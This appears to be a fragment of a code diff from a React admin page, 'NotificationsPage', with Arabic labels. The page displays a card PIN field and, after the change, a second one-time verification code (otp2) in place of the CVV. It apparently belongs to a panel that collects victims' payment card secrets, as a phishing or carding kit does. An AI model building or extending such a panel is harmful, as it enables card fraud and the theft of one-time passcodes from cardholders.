@@ -491,7 +491,7 @@ export default function NotificationsPage() {
                 <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv! }
+                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp2! }
               </p>
             </div>
           )}
